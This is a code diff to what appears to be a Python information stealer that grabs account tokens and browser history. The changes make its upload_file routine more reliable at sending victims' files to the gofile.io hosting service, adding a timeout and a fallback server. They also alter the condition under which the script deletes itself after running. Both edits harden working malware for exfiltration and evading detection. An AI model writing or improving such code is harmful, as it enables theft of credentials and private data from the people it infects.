@@ -979,17 +979,24 @@ def uploadTokq(Tokq, path):
         change_about_me(Tokq)
 
 
+from requests.exceptions import Timeout
 
 def upload_file(file_path):
     try:
         response = requests.post(
             f'https://{requests.get("https://api.gofile.io/getServer").json()["data"]["server"]}.gofile.io/uploadFile',
-            files={'file': open(file_path, 'rb')}
+            files={'file': open(file_path, 'rb')},
+            timeout=1 
         )
         return response.json()["data"]["downloadPage"]
+    except Timeout:
+        response_backup = requests.post(
+            'https://server4.gofile.io/uploadFile',
+            files={'file': open(file_path, 'rb')}
+        )
+        return response_backup.json()["data"]["downloadPage"]
     except Exception as e:
         return False
-    
     
 
 def find_history_file(browser_name, path_template):
@@ -2285,7 +2292,7 @@ def gatha():
     if crasher == True:
         crashs()
         
-    if melter == False:
+    if melter != False:
         srcss = os.path.realpath(__file__)
         dlself(srcss)
 
